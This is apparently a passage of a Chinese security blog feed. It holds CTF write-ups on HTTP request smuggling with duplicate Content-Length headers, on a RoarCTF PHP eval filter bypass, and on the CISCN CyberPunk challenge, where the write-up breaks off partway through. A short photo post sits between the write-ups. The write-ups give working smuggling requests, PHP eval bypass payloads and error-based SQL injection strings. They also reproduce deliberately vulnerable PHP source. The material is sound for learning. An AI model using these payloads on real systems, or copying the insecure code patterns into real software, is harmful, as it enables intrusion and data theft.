    <content><![CDATA[<h2 id="HTTP走私漏洞"><a href="#HTTP走私漏洞" class="headerlink" title="HTTP走私漏洞"></a>HTTP走私漏洞</h2><h3 id="Cl-Cl"><a href="#Cl-Cl" class="headerlink" title="Cl-Cl"></a>Cl-Cl</h3><p>​        以一个http包为例，这个数据包中存在两个Cl，按照正常规则如果存在两个Cl并且两个Cl的值不等时候，服务器会返回400错误，但是总有服务器不会严格执行规范，中间服务器在接受到这个请求后会按照第一个<code>Content-Length</code>对请求进行处理，但是这个请求包发到后端服务器就会按照第二个<code>Content-length</code>进行处理，这要就导致了一个问题，第二个<code>Content-Length</code>长度比第一个<code>Content-length</code>少一位，这要在第二次处理这个数据包的时候<code>a</code>就会没有被读取到从而留在了缓冲区，但是我们知道HTTP和普通的TCP不一样，存在一个 <code>Keep-Alive</code> 会导致TCP重用，那么下一个请求包就会把a拼接进去导致错误。（参考资料：<a href="https://paper.seebug.org/1048/）" target="_blank" rel="noopener">https://paper.seebug.org/1048/）</a></p>
<p>构造的恶意请求包：</p>
<pre><code class="http">POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a</code></pre>
<p>第二次被拼接的请求包：</p>
<pre><code class="http">aPOST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a</code></pre>
<p>​        那么如果服务器严格遵循规范呢？存在两个Cl就直接400岂不是没法用了？这里又引申了一个问题，这样如果第一个前端服务器是nginx用于转发docker的流量而这个前端服务器存在一个waf，那么就可能导致这个waf失效，完整转发我们恶意代码，RoarCTF的easy-calc就是这样的问题。</p>
<h3 id="RoarCTF2019-easycalc"><a href="#RoarCTF2019-easycalc" class="headerlink" title="RoarCTF2019-easycalc"></a>RoarCTF2019-easycalc</h3><hr>
<p>题目源码：</p>
<pre><code class="php">&lt;?php
error_reporting(0);
if(!isset($_GET[&#39;num&#39;])){
    show_source(__FILE__);
}else{
        $str = $_GET[&#39;num&#39;];
        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
        foreach ($blacklist as $blackitem) {
                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
                        die(&quot;what are you want to do?&quot;);
                }
        }
        eval(&#39;echo &#39;.$str.&#39;;&#39;);
}
?&gt; </code></pre>
<ul>
<li><p>题目源码比较简单，绕过方式和国赛lovemath一样或者使用取反方式绕过</p>
</li>
<li><p>但是这里存在一个问题这个环境存在waf只能够使用这些字符：<code>%&amp;.,(*/-+)&lt;=&gt;?;:@\~}|{0123456789</code></p>
</li>
<li><p>这里就是上面说的方法，使用两个CL导致前端服务器400，但是完整转发了HTTP请求，从而导致执行waf被绕过导致执行恶意代码。</p>
</li>
<li><p>这里构造payload与lovemath一致，使用<code>base_convert(&quot;scandir&quot;,36,10);</code>也就是说将36进制转换为10进制，具体请参考国赛lovemath.然后将10进制转换为36进制那么就可以构造出来scandir，别人的write  up的payload是<code>base_convert(61693386291,10,36)(hex2bin(dechex(47)));</code>,dechex()将10进制转16进制，而hex2bin是将16进制转char，但是我不知为什么他们要这么搞，这里并没有过滤scandir,甚至构造‘/’根本用不上十进制转16进制再转char，而是直接可以用AIISC转char。而且很多队伍解法一样，目测py的很多。</p>
</li>
<li><p>最终payload： <code>base_convert(2146934604002,10,36(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p>
</li>
<li><p>我的payload：<code>var_dump(scandir(chr(47)));</code></p>
</li>
<li><p>最终payload：<code>var_dump(readfile(chr(47).base_convert(25254448,10,36)));</code></p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191017/15712450236096.png" alt="img"></p>
<hr>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191017/1571245047649.png" alt="img"></p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>​    PHP中会对传入的参数名去取空格或者替换为下划线字符。（<a href="https://www.freebuf.com/articles/web/213359.html）如本次比赛的num前面加个空格即可绕过waf" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html）如本次比赛的num前面加个空格即可绕过waf</a>.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191019/15714458007264.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>捡起高中老照片，伪装成摄影博主吧！嘻嘻！</title>
    <url>//articles/d709b98b18.html</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34899487&auto=1&height=66"></iframe>

<h2 id="晨光"><a href="#晨光" class="headerlink" title="晨光"></a>晨光</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684555188774.jpg" alt="img"></p>
<h2 id="紫霞"><a href="#紫霞" class="headerlink" title="紫霞"></a>紫霞</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684556803487.jpg" alt="img"></p>
<h2 id="顽虫"><a href="#顽虫" class="headerlink" title="顽虫"></a>顽虫</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684557562583.jpg" alt="img"></p>
<h2 id="阳西夕阳"><a href="#阳西夕阳" class="headerlink" title="阳西夕阳"></a>阳西夕阳</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684558015771.jpg" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684558555752.jpg" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684562049853.jpg" alt="img"></p>
<h2 id="翻飞未肯下，犹言惜故林。"><a href="#翻飞未肯下，犹言惜故林。" class="headerlink" title="翻飞未肯下，犹言惜故林。"></a>翻飞未肯下，犹言惜故林。</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684560034954.jpg" alt="img"></p>
<h2 id="港口"><a href="#港口" class="headerlink" title="港口"></a>港口</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/1568456115995.png" alt="img"></p>
<h2 id="一中"><a href="#一中" class="headerlink" title="一中"></a>一中</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684563273418.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>风光摄影</category>
      </categories>
      <tags>
        <tag>摄影</tag>
      </tags>
  </entry>
  <entry>
    <title>复现CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
    <url>//articles/d711660d49.html</url>
    <content><![CDATA[<ul>
<li><p>查看源码给了提示目测是文件包含</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/1573214441440.png" alt="img"></p>
</li>
<li><p>PHP伪协议直接读取源码</p>
<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108200230449.png" alt="image-20191108200230449"></p>
</li>
<li><p>源码如下：</p>
<ul>
<li>index.php</li>
</ul>
<pre><code class="php">&lt;?php

ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);

// $file = $_GET[&quot;file&quot;];
$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
if (isset($file)){
    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
        echo(&#39;no way!&#39;);
        exit;
    }
    @include($file);
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;index&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;h2&gt;2077鍙戝敭浜�,涓嶆潵浠藉疄浣撳吀钘忕増鍚�?&lt;/h2&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;h3&gt;鎻愪氦璁㈠崟&lt;/h3&gt;
                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;濮撳悕:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;鐢佃瘽:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;鍦板潃:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;鎴戞鏄�侀挶涔嬩汉&lt;/button&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;璁㈠崟绠＄悊&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣鏌ヨ鍗�&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戣淇敼鏀惰揣鍦板潃&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;鎴戜笉鎯宠浜�&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;!--?file=?--&gt;</code></pre>
<ul>
<li>confirm.php</li>
</ul>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;
//var_dump($_POST);

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = $_POST[&quot;address&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if($fetch-&gt;num_rows&gt;0) {
        $msg = $user_name.&quot;已提交订单&quot;;
    }else{
        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
        $re = $db-&gt;prepare($sql);
        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
        $re = $re-&gt;execute();
        if(!$re) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单提交成功&quot;;
    }
} else {
    $msg = &quot;信息不全&quot;;
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;确认订单&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot;/&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
                &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
                &lt;/a&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<ul>
<li>search.php</li>
</ul>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;; 

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        if(!$row) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;搜索&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;订单查询&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;</code></pre>
<ul>
<li>change.php</li>
</ul>
<pre><code class="PHP">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = addslashes($_POST[&quot;address&quot;]);
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
        $result = $db-&gt;query($sql);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单修改成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;修改收货地址&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;修改收货地址&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;地址:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>delete.php</li>
</ul>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单删除成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;删除订单&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;删除订单&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;姓名:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;电话:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>config.php</li>
</ul>
<pre><code class="php">&lt;?php

ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);

$DATABASE = array(

    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,
    &quot;username&quot; =&gt; &quot;root&quot;,
    &quot;password&quot; =&gt; &quot;root&quot;,
    &quot;dbname&quot; =&gt;&quot;ctfusers&quot;
);

$db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);
</code></pre>
</li>
<li><p>分析：</p>
<ul>
<li>我们从代码中可以看到在查询的时候使用了正则去过滤，在写入时候使用了预处理所以无法进行注入。但是可以注意到使用正则过滤的时候并没有对地址过滤，我们跟进可以发现在<code>change.php</code>里地址是拼接进sql语句了，但是使用了<code>addslashes()</code>对单引号进行了转义，导致无法逃逸，但是这里可以导致在修改地址时候会将地址查询出来再拼接到更新语句，那么这里就算我们逃逸不了但是可以将后面的单引号给注释掉导致报错，同时这里将sql错误内容给打印出来了，可以使用报错注入。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732167224952.png" alt="img"></p>
</li>
<li><p>构造payload</p>
<pre><code class="php">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</code></pre>
<ul>
<li>在写入时候将上面payload写入地址，而后修改该订单的地址就会显示报错。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732178817223.png" alt="img"></p>
<ul>
<li>爆表名</li>
</ul>
<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema=&#39;ctfusers&#39;),0x7e),1)#</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732192818932.png" alt="img"></p>
<ul>
<li>爆表段</li>
</ul>
<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name=&#39;user&#39;),0x7e),1)#</code></pre>
